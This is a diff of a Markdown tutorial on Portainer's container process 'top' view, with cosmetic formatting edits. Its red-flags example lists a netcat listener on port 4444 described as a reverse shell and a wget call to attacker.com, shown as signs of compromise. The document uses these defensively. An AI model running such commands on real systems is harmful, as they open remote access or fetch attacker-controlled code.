@@ -8,7 +8,7 @@ Description: Learn how to view the running processes inside a Docker container u
 
 ## Introduction
 
-Sometimes you need to see what processes are running inside a container — useful for debugging, verifying that only expected processes are running, or identifying runaway processes consuming resources. Portainer provides a "top" view for containers that shows running processes without needing to exec into the container.
+Sometimes you need to see what processes are running inside a container - useful for debugging, verifying that only expected processes are running, or identifying runaway processes consuming resources. Portainer provides a "top" view for containers that shows running processes without needing to exec into the container.
 
 ## Prerequisites
 
@@ -27,7 +27,7 @@ This shows a table of all processes running inside the container, similar to the
 
 The top view shows columns similar to `ps aux`:
 
-```
+```text
 PID     USER     TIME     COMMAND
 1       root     0:00     nginx: master process nginx -g daemon off;
 30      101      0:00     nginx: worker process
@@ -46,7 +46,7 @@ PID     USER     TIME     COMMAND
 ### Expected Processes
 
 A healthy Nginx container should only show:
-```
+```text
 1    root    nginx: master process
 30   nginx   nginx: worker process
 31   nginx   nginx: worker process
@@ -54,7 +54,7 @@ A healthy Nginx container should only show:
 
 ### Unexpected Processes (Red Flags)
 
-```
+```text
 1    root    /bin/sh                     ← Shell running (from exec session?)
 45   root    nc -l 0.0.0.0 -p 4444       ← Reverse shell (security concern!)
 50   root    wget http://attacker.com    ← Downloading something?
@@ -64,7 +64,7 @@ A production container should only run the processes its image was designed to r
 
 ### Zombie Processes
 
-```
+```text
 PID     STATUS    COMMAND
 1234    Z         [my-app] <defunct>
 ```
@@ -75,6 +75,7 @@ PID     STATUS    COMMAND
 
 ```bash
 # View processes in a container:
+
 docker top my-container
 
 # With ps options:
@@ -189,4 +190,4 @@ If the Top view is unavailable or empty:
 
 ## Conclusion
 
-Portainer's container top view provides a quick window into the processes running inside your containers — essential for debugging performance issues, verifying container contents, auditing security, and identifying zombie processes. Combined with the exec console for deeper investigation, you have powerful tools for container introspection directly from the Portainer web interface.
+Portainer's container top view provides a quick window into the processes running inside your containers - essential for debugging performance issues, verifying container contents, auditing security, and identifying zombie processes. Combined with the exec console for deeper investigation, you have powerful tools for container introspection directly from the Portainer web interface.
